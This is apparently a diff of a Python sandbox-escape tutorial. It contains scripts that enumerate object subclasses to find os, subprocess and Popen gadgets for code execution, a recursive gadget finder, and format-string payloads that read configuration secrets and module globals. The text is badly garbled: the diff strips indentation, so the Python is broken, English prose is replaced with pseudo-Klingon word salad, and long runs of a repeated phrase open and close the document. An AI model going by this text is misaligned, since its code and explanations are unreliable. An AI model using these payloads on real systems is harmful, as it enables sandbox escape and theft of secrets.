'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh '
 ```python
 bad_libraries_names = ["os", "commands", "subprocess", "pty", "importlib", "imp", "sys", "builtins", "pip", "pdb"]
 for b in bad_libraries_names:
-     vuln_libs = [ x.__name__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and b in x.__init__.__globals__ ]
-     print(f"{b}: {', '.join(vuln_libs)}")
+vuln_libs = [ x.__name__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and b in x.__init__.__globals__ ]
+print(f"{b}: {', '.join(vuln_libs)}")
 
 """
 os: CompletedProcess, Popen, NullImporter, _HackedGetData, SSLObject, Request, OpenerDirector, HTTPPasswordMgr, AbstractBasicAuthHandler, AbstractDigestAuthHandler, URLopener, _PaddedFile, CompressedValue, LogRecord, PercentStyle, Formatter, BufferingFormatter, Filter, Filterer, PlaceHolder, Manager, LoggerAdapter, HTTPConnection, MimeTypes, BlockFinder, Parameter, BoundArguments, Signature, _FragList, _SSHFormatECDSA, CertificateSigningRequestBuilder, CertificateBuilder, CertificateRevocationListBuilder, RevokedCertificateBuilder, _CallbackExceptionHelper, Context, Connection, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path, _Flavour, _Selector, Cookie, CookieJar, BaseAdapter, InstallProgress, TextProgress, BaseDependency, Origin, Version, Package, _WrappedLock, Cache, ProblemResolver, _FilteredCacheHelper, FilteredCache, NullTranslations
-commands: 
+commands:
 subprocess: BaseDependency, Origin, Version, Package
-pty: 
+pty:
 importlib: NullImporter, _HackedGetData, BlockFinder, Parameter, BoundArguments, Signature, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path
-imp: 
+imp:
 sys: _ModuleLock, _DummyModuleLock, _ModuleLockManager, ModuleSpec, FileLoader, _NamespacePath, _NamespaceLoader, FileFinder, zipimporter, _ZipImportResourceReader, IncrementalEncoder, IncrementalDecoder, StreamReaderWriter, StreamRecoder, _wrap_close, Quitter, _Printer, WarningMessage, catch_warnings, _GeneratorContextManagerBase, _BaseExitStack, Untokenizer, FrameSummary, TracebackException, CompletedProcess, Popen, finalize, NullImporter, _HackedGetData, _localized_month, _localized_day, Calendar, different_locale, SSLObject, Request, OpenerDirector, HTTPPasswordMgr, AbstractBasicAuthHandler, AbstractDigestAuthHandler, URLopener, _PaddedFile, CompressedValue, LogRecord, PercentStyle, Formatter, BufferingFormatter, Filter, Filterer, PlaceHolder, Manager, LoggerAdapter, _LazyDescr, _SixMetaPathImporter, MimeTypes, ConnectionPool, _LazyDescr, _SixMetaPathImporter, Bytecode, BlockFinder, Parameter, BoundArguments, Signature, _DeprecatedValue, _ModuleWithDeprecations, Scrypt, WrappedSocket, PyOpenSSLContext, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path, _Flavour, _Selector, JSONDecoder, Response, monkeypatch, InstallProgress, TextProgress, BaseDependency, Origin, Version, Package, _Framer, _Unframer, _Pickler, _Unpickler, NullTranslations, _wrap_close
 builtins: FileLoader, _NamespacePath, _NamespaceLoader, FileFinder, IncrementalEncoder, IncrementalDecoder, StreamReaderWriter, StreamRecoder, Repr, Completer, CompletedProcess, Popen, _PaddedFile, BlockFinder, Parameter, BoundArguments, Signature
 pdb:
 """
 ```
-
-Moreover, if you think **other libraries** may be able to **invoke functions to execute commands**, we can also **filter by functions names** inside the possible libraries:
-
+DaH jImej, **ghItlh libraries** **ghaH 'ej commands execute functions'** **invoke** **chel** **'ej, **we can also **filter by functions names** **inside the possible libraries**:
 ```python
 bad_libraries_names = ["os", "commands", "subprocess", "pty", "importlib", "imp", "sys", "builtins", "pip", "pdb"]
 bad_func_names = ["system", "popen", "getstatusoutput", "getoutput", "call", "Popen", "spawn", "import_module", "__import__", "load_source", "execfile", "execute", "__builtins__"]
 for b in bad_libraries_names + bad_func_names:
-     vuln_funcs = [ x.__name__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) for k in x.__init__.__globals__ if k == b ]
-     print(f"{b}: {', '.join(vuln_funcs)}")
-     
+vuln_funcs = [ x.__name__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) for k in x.__init__.__globals__ if k == b ]
+print(f"{b}: {', '.join(vuln_funcs)}")
+
 """
 os: CompletedProcess, Popen, NullImporter, _HackedGetData, SSLObject, Request, OpenerDirector, HTTPPasswordMgr, AbstractBasicAuthHandler, AbstractDigestAuthHandler, URLopener, _PaddedFile, CompressedValue, LogRecord, PercentStyle, Formatter, BufferingFormatter, Filter, Filterer, PlaceHolder, Manager, LoggerAdapter, HTTPConnection, MimeTypes, BlockFinder, Parameter, BoundArguments, Signature, _FragList, _SSHFormatECDSA, CertificateSigningRequestBuilder, CertificateBuilder, CertificateRevocationListBuilder, RevokedCertificateBuilder, _CallbackExceptionHelper, Context, Connection, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path, _Flavour, _Selector, Cookie, CookieJar, BaseAdapter, InstallProgress, TextProgress, BaseDependency, Origin, Version, Package, _WrappedLock, Cache, ProblemResolver, _FilteredCacheHelper, FilteredCache, NullTranslations
-commands: 
+commands:
 subprocess: BaseDependency, Origin, Version, Package
-pty: 
+pty:
 importlib: NullImporter, _HackedGetData, BlockFinder, Parameter, BoundArguments, Signature, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path
-imp: 
+imp:
 sys: _ModuleLock, _DummyModuleLock, _ModuleLockManager, ModuleSpec, FileLoader, _NamespacePath, _NamespaceLoader, FileFinder, zipimporter, _ZipImportResourceReader, IncrementalEncoder, IncrementalDecoder, StreamReaderWriter, StreamRecoder, _wrap_close, Quitter, _Printer, WarningMessage, catch_warnings, _GeneratorContextManagerBase, _BaseExitStack, Untokenizer, FrameSummary, TracebackException, CompletedProcess, Popen, finalize, NullImporter, _HackedGetData, _localized_month, _localized_day, Calendar, different_locale, SSLObject, Request, OpenerDirector, HTTPPasswordMgr, AbstractBasicAuthHandler, AbstractDigestAuthHandler, URLopener, _PaddedFile, CompressedValue, LogRecord, PercentStyle, Formatter, BufferingFormatter, Filter, Filterer, PlaceHolder, Manager, LoggerAdapter, _LazyDescr, _SixMetaPathImporter, MimeTypes, ConnectionPool, _LazyDescr, _SixMetaPathImporter, Bytecode, BlockFinder, Parameter, BoundArguments, Signature, _DeprecatedValue, _ModuleWithDeprecations, Scrypt, WrappedSocket, PyOpenSSLContext, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path, _Flavour, _Selector, JSONDecoder, Response, monkeypatch, InstallProgress, TextProgress, BaseDependency, Origin, Version, Package, _Framer, _Unframer, _Pickler, _Unpickler, NullTranslations, _wrap_close
 builtins: FileLoader, _NamespacePath, _NamespaceLoader, FileFinder, IncrementalEncoder, IncrementalDecoder, StreamReaderWriter, StreamRecoder, Repr, Completer, CompletedProcess, Popen, _PaddedFile, BlockFinder, Parameter, BoundArguments, Signature
 pip:
@@ -605,57 +715,55 @@ getstatusoutput: CompletedProcess, Popen
 getoutput: CompletedProcess, Popen
 call: CompletedProcess, Popen
 Popen: CompletedProcess, Popen
-spawn: 
-import_module: 
+spawn:
+import_module:
 __import__: _ModuleLock, _DummyModuleLock, _ModuleLockManager, ModuleSpec
 load_source: NullImporter, _HackedGetData
-execfile: 
-execute: 
+execfile:
+execute:
 __builtins__: _ModuleLock, _DummyModuleLock, _ModuleLockManager, ModuleSpec, FileLoader, _NamespacePath, _NamespaceLoader, FileFinder, zipimporter, _ZipImportResourceReader, IncrementalEncoder, IncrementalDecoder, StreamReaderWriter, StreamRecoder, _wrap_close, Quitter, _Printer, DynamicClassAttribute, _GeneratorWrapper, WarningMessage, catch_warnings, Repr, partialmethod, singledispatchmethod, cached_property, _GeneratorContextManagerBase, _BaseExitStack, Completer, State, SubPattern, Tokenizer, Scanner, Untokenizer, FrameSummary, TracebackException, _IterationGuard, WeakSet, _RLock, Condition, Semaphore, Event, Barrier, Thread, CompletedProcess, Popen, finalize, _TemporaryFileCloser, _TemporaryFileWrapper, SpooledTemporaryFile, TemporaryDirectory, NullImporter, _HackedGetData, DOMBuilder, DOMInputSource, NamedNodeMap, TypeInfo, ReadOnlySequentialNamedNodeMap, ElementInfo, Template, Charset, Header, _ValueFormatter, _localized_month, _localized_day, Calendar, different_locale, AddrlistClass, _PolicyBase, BufferedSubFile, FeedParser, Parser, BytesParser, Message, HTTPConnection, SSLObject, Request, OpenerDirector, HTTPPasswordMgr, AbstractBasicAuthHandler, AbstractDigestAuthHandler, URLopener, _PaddedFile, Address, Group, HeaderRegistry, ContentManager, CompressedValue, _Feature, LogRecord, PercentStyle, Formatter, BufferingFormatter, Filter, Filterer, PlaceHolder, Manager, LoggerAdapter, _LazyDescr, _SixMetaPathImporter, Queue, _PySimpleQueue, HMAC, Timeout, Retry, HTTPConnection, MimeTypes, RequestField, RequestMethods, DeflateDecoder, GzipDecoder, MultiDecoder, ConnectionPool, CharSetProber, CodingStateMachine, CharDistributionAnalysis, JapaneseContextAnalysis, UniversalDetector, _LazyDescr, _SixMetaPathImporter, Bytecode, BlockFinder, Parameter, BoundArguments, Signature, _DeprecatedValue, _ModuleWithDeprecations, DSAParameterNumbers, DSAPublicNumbers, DSAPrivateNumbers, ObjectIdentifier, ECDSA, EllipticCurvePublicNumbers, EllipticCurvePrivateNumbers, RSAPrivateNumbers, RSAPublicNumbers, DERReader, BestAvailableEncryption, CBC, XTS, OFB, CFB, CFB8, CTR, GCM, Cipher, _CipherContext, _AEADCipherContext, AES, Camellia, TripleDES, Blowfish, CAST5, ARC4, IDEA, SEED, ChaCha20, _FragList, _SSHFormatECDSA, Hash, SHAKE128, SHAKE256, BLAKE2b, BLAKE2s, NameAttribute, RelativeDistinguishedName, Name, RFC822Name, DNSName, UniformResourceIdentifier, DirectoryName, RegisteredID, IPAddress, OtherName, Extensions, CRLNumber, AuthorityKeyIdentifier, SubjectKeyIdentifier, AuthorityInformationAccess, SubjectInformationAccess, AccessDescription, BasicConstraints, DeltaCRLIndicator, CRLDistributionPoints, FreshestCRL, DistributionPoint, PolicyConstraints, CertificatePolicies, PolicyInformation, UserNotice, NoticeReference, ExtendedKeyUsage, TLSFeature, InhibitAnyPolicy, KeyUsage, NameConstraints, Extension, GeneralNames, SubjectAlternativeName, IssuerAlternativeName, CertificateIssuer, CRLReason, InvalidityDate, PrecertificateSignedCertificateTimestamps, SignedCertificateTimestamps, OCSPNonce, IssuingDistributionPoint, UnrecognizedExtension, CertificateSigningRequestBuilder, CertificateBuilder, CertificateRevocationListBuilder, RevokedCertificateBuilder, _OpenSSLError, Binding, _X509NameInvalidator, PKey, _EllipticCurve, X509Name, X509Extension, X509Req, X509, X509Store, X509StoreContext, Revoked, CRL, PKCS12, NetscapeSPKI, _PassphraseHelper, _CallbackExceptionHelper, Context, Connection, _CipherContext, _CMACContext, _X509ExtensionParser, DHPrivateNumbers, DHPublicNumbers, DHParameterNumbers, _DHParameters, _DHPrivateKey, _DHPublicKey, Prehashed, _DSAVerificationContext, _DSASignatureContext, _DSAParameters, _DSAPrivateKey, _DSAPublicKey, _ECDSASignatureContext, _ECDSAVerificationContext, _EllipticCurvePrivateKey, _EllipticCurvePublicKey, _Ed25519PublicKey, _Ed25519PrivateKey, _Ed448PublicKey, _Ed448PrivateKey, _HashContext, _HMACContext, _Certificate, _RevokedCertificate, _CertificateRevocationList, _CertificateSigningRequest, _SignedCertificateTimestamp, OCSPRequestBuilder, _SingleResponse, OCSPResponseBuilder, _OCSPResponse, _OCSPRequest, _Poly1305Context, PSS, OAEP, MGF1, _RSASignatureContext, _RSAVerificationContext, _RSAPrivateKey, _RSAPublicKey, _X25519PublicKey, _X25519PrivateKey, _X448PublicKey, _X448PrivateKey, Scrypt, PKCS7SignatureBuilder, Backend, GetCipherByName, WrappedSocket, PyOpenSSLContext, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path, _Flavour, _Selector, RawJSON, JSONDecoder, JSONEncoder, Cookie, CookieJar, MockRequest, MockResponse, Response, BaseAdapter, UnixHTTPConnection, monkeypatch, JSONDecoder, JSONEncoder, InstallProgress, TextProgress, BaseDependency, Origin, Version, Package, _WrappedLock, Cache, ProblemResolver, _FilteredCacheHelper, FilteredCache, _Framer, _Unframer, _Pickler, _Unpickler, NullTranslations, _wrap_close
 """
 ```
-
 ## Recursive Search of Builtins, Globals...
 
 {% hint style="warning" %}
-This is just **awesome**. If you are **looking for an object like globals, builtins, open or anything** just use this script to **recursively find places where you can find that object.**
+**Qapla'!** Qagh 'oH **jatlh**. Qo'noS **ghaH 'e' vItlhutlh, builtins, open** bejegh 'e' vItlhutlh **ghItlhvam script** vItlhutlh **ghItlhvam lo'laHvam vItlhutlh.**
 {% endhint %}
-
 ```python
 import os, sys # Import these to find more gadgets
 
 SEARCH_FOR = {
-    # Misc
-    "__globals__": set(),
-    "builtins": set(),
-    "__builtins__": set(),
-    "open": set(),
-    
-    # RCE libs
-    "os": set(),
-    "subprocess": set(),
-    "commands": set(),
-    "pty": set(),
-    "importlib": set(),
-    "imp": set(),
-    "sys": set(),
-    "pip": set(),
-    "pdb": set(),
-    
-    # RCE methods
-    "system": set(),
-    "popen": set(),
-    "getstatusoutput": set(),
-    "getoutput": set(),
-    "call": set(),
-    "Popen": set(),
-    "popen": set(),
-    "spawn": set(),
-    "import_module": set(),
-    "__import__": set(),
-    "load_source": set(),
-    "execfile": set(),
-    "execute": set()
+# Misc
+"__globals__": set(),
+"builtins": set(),
+"__builtins__": set(),
+"open": set(),
+
+# RCE libs
+"os": set(),
+"subprocess": set(),
+"commands": set(),
+"pty": set(),
+"importlib": set(),
+"imp": set(),
+"sys": set(),
+"pip": set(),
+"pdb": set(),
+
+# RCE methods
+"system": set(),
+"popen": set(),
+"getstatusoutput": set(),
+"getoutput": set(),
+"call": set(),
+"Popen": set(),
+"popen": set(),
+"spawn": set(),
+"import_module": set(),
+"__import__": set(),
+"load_source": set(),
+"execfile": set(),
+"execute": set()
 }
 
 #More than 4 is very time consuming
@@ -665,78 +773,77 @@ MAX_CONT = 4
 #ALREADY_CHECKED = set()
 
 def check_recursive(element, cont, name, orig_n, orig_i, execute):
-    # If bigger than maximum, stop
-    if cont > MAX_CONT:
-        return
-    
-    # If already checked, stop
-    #if name and name in ALREADY_CHECKED:
-    #    return
-    
-    # Add to already checked
-    #if name:
-    #    ALREADY_CHECKED.add(name)
-    
-    # If found add to the dict
-    for k in SEARCH_FOR:
-        if k in dir(element) or (type(element) is dict and k in element):
-            SEARCH_FOR[k].add(f"{orig_i}: {orig_n}.{name}")
-    
-    # Continue with the recursivity
-    for new_element in dir(element):
-        try:
-            check_recursive(getattr(element, new_element), cont+1, f"{name}.{new_element}", orig_n, orig_i, execute)
-            
-            # WARNING: Calling random functions sometimes kills the script
-            # Comment this part if you notice that behaviour!!
-            if execute:
-                try:
-                    if callable(getattr(element, new_element)):
-                        check_recursive(getattr(element, new_element)(), cont+1, f"{name}.{new_element}()", orig_i, execute)
-                except:
-                    pass
-        
-        except:
-            pass
-    
-    # If in a dict, scan also each key, very important
-    if type(element) is dict:
-        for new_element in element:
-            check_recursive(element[new_element], cont+1, f"{name}[{new_element}]", orig_n, orig_i)
+# If bigger than maximum, stop
+if cont > MAX_CONT:
+return
+
+# If already checked, stop
+#if name and name in ALREADY_CHECKED:
+#    return
+
+# Add to already checked
+#if name:
+#    ALREADY_CHECKED.add(name)
+
+# If found add to the dict
+for k in SEARCH_FOR:
+if k in dir(element) or (type(element) is dict and k in element):
+SEARCH_FOR[k].add(f"{orig_i}: {orig_n}.{name}")
+
+# Continue with the recursivity
+for new_element in dir(element):
+try:
+check_recursive(getattr(element, new_element), cont+1, f"{name}.{new_element}", orig_n, orig_i, execute)
+
+# WARNING: Calling random functions sometimes kills the script
+# Comment this part if you notice that behaviour!!
+if execute:
+try:
+if callable(getattr(element, new_element)):
+check_recursive(getattr(element, new_element)(), cont+1, f"{name}.{new_element}()", orig_i, execute)
+except:
+pass
+
+except:
+pass
+
+# If in a dict, scan also each key, very important
+if type(element) is dict:
+for new_element in element:
+check_recursive(element[new_element], cont+1, f"{name}[{new_element}]", orig_n, orig_i)
 
 
 def main():
-    print("Checking from empty string...")
-    total = [""]
-    for i,element in enumerate(total):
-        print(f"\rStatus: {i}/{len(total)}", end="")
-        cont = 1
-        check_recursive(element, cont, "", str(element), f"Empty str {i}", True)
-    
-    print()
-    print("Checking loaded subclasses...")
-    total = "".__class__.__base__.__subclasses__()
-    for i,element in enumerate(total):
-        print(f"\rStatus: {i}/{len(total)}", end="")
-        cont = 1
-        check_recursive(element, cont, "", str(element), f"Subclass {i}", True)
-    
-    print()
-    print("Checking from global functions...")
-    total = [print, check_recursive]
-    for i,element in enumerate(total):
-        print(f"\rStatus: {i}/{len(total)}", end="")
-        cont = 1
-        check_recursive(element, cont, "", str(element), f"Global func {i}", False)
-    
-    print()
-    print(SEARCH_FOR)
+print("Checking from empty string...")
+total = [""]
+for i,element in enumerate(total):
+print(f"\rStatus: {i}/{len(total)}", end="")
+cont = 1
+check_recursive(element, cont, "", str(element), f"Empty str {i}", True)
+
+print()
+print("Checking loaded subclasses...")
+total = "".__class__.__base__.__subclasses__()
+for i,element in enumerate(total):
+print(f"\rStatus: {i}/{len(total)}", end="")
+cont = 1
+check_recursive(element, cont, "", str(element), f"Subclass {i}", True)
+
+print()
+print("Checking from global functions...")
+total = [print, check_recursive]
+for i,element in enumerate(total):
+print(f"\rStatus: {i}/{len(total)}", end="")
+cont = 1
+check_recursive(element, cont, "", str(element), f"Global func {i}", False)
+
+print()
+print(SEARCH_FOR)
 
 
 if __name__ == "__main__":
-    main()
+main()
 ```
-
 You can check the output of this script on this page:
 
 {% content-ref url="broken-reference" %}
@@ -759,52 +866,44 @@ If you **send** a **string** to python that is going to be **formatted**, you ca
 However, there is a **limitation**, you can only use the symbols `.[]`, so you **won't be able to execute arbitrary code**, just to read information.\
 _**If you know how to execute code through this vulnerability, please contact me.**_
 {% endhint %}
-
 ```python
 # Example from https://www.geeksforgeeks.org/vulnerability-in-str-format-in-python/
 CONFIG = {
-    "KEY": "ASXFYFGK78989"
+"KEY": "ASXFYFGK78989"
 }
 
 class PeopleInfo:
-    def __init__(self, fname, lname):
-        self.fname = fname
-        self.lname = lname
+def __init__(self, fname, lname):
+self.fname = fname
+self.lname = lname
 
 def get_name_for_avatar(avatar_str, people_obj):
-    return avatar_str.format(people_obj = people_obj)
+return avatar_str.format(people_obj = people_obj)
 
 people = PeopleInfo('GEEKS', 'FORGEEKS')
 
 st = "{people_obj.__init__.__globals__[CONFIG][KEY]}"
 get_name_for_avatar(st, people_obj = people)
 ```
+Qapla'! jatlhpu' **Dot** vItlhutlh 'ej **people_obj.__init__** laH **attributes** **access** **'ej** **parenthesis** **dict element** **quotes** **without** `__globals__[CONFIG]`
 
-Note how you can **access attributes** in a normal way with a **dot** like `people_obj.__init__` and **dict element** with **parenthesis** without quotes `__globals__[CONFIG]`
-
-Also note that you can use `.__dict__` to enumerate elements of an object `get_name_for_avatar("{people_obj.__init__.__globals__[os].__dict__}", people_obj = people)`
-
-Some other interesting characteristics from format strings is the possibility of **executing** the **functions** **`str`**, **`repr`** and **`ascii`** in the indicated object by adding **`!s`**, **`!r`**, **`!a`** respectively:
-
+'ej **enumerate** **elements** **object** **`.__dict__`** **use** **can** **you** **note** **Also** `get_name_for_avatar("{people_obj.__init__.__globals__[os].__dict__}", people_obj = people)` **object** **indicated** **the** **functions** **`str`**, **`repr`** **`ascii`** **executing** **of** **possibility** **the** **is** **strings format** **from** **other** **Some** **characteristics** **interesting**:
 ```python
 st = "{people_obj.__init__.__globals__[CONFIG][KEY]!a}"
 get_name_for_avatar(st, people_obj = people)
 ```
-
-Moreover, it's possible to **code new formatters** in classes:
-
+**Qatlh**, **ghaH** **code** **new formatters** **in classes** **possible**:
 ```python
 class HAL9000(object):
-    def __format__(self, format):
-        if (format == 'open-the-pod-bay-doors'):
-            return "I'm afraid I can't do that."
-        return 'HAL 9000'
+def __format__(self, format):
+if (format == 'open-the-pod-bay-doors'):
+return "I'm afraid I can't do that."
+return 'HAL 9000'
 
 '{:open-the-pod-bay-doors}'.format(HAL9000())
 #I'm afraid I can't do that.
 ```
-
-**More examples** about **format** **string** examples can be found in [**https://pyformat.info/**](https://pyformat.info)
+**ghItlh examples** about **format** **string** examples can be found in [**https://pyformat.info/**](https://pyformat.info)
 
 {% hint style="danger" %}
 Check also the following page for gadgets that will r**ead sensitive information from Python internal objects**:
@@ -815,7 +914,6 @@ Check also the following page for gadgets that will r**ead sensitive information
 {% endcontent-ref %}
 
 ### Sensitive Information Disclosure Payloads
-
 ```python
 {whoami.__class__.__dict__}
 {whoami.__globals__[os].__dict__}
@@ -826,7 +924,6 @@ Check also the following page for gadgets that will r**ead sensitive information
 # Access an element through several links
 {whoami.__globals__[server].__dict__[bridge].__dict__[db].__dict__}
 ```
-
 ## Dissecting Python Objects
 
 {% hint style="info" %}
@@ -836,31 +933,28 @@ If you want to **learn** about **python bytecode** in depth read this **awesome*
 In some CTFs you could be provided with the name of a **custom function where the flag** resides and you need to see the **internals** of the **function** to extract it.
 
 This is the function to inspect:
-
 ```python
 def get_flag(some_input):
-    var1=1
-    var2="secretcode"
-    var3=["some","array"]
-    if some_input == var2:
-        return "THIS-IS-THE-FALG!"
-    else:
-        return "Nope"
+var1=1
+var2="secretcode"
+var3=["some","array"]
+if some_input == var2:
+return "THIS-IS-THE-FALG!"
+else:
+return "Nope"
 ```
+#### qImHa' 
 
-#### dir
-
+`dir` jatlhlaHbe'chugh, 'ej 'oH jatlhlaHbe'chugh 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 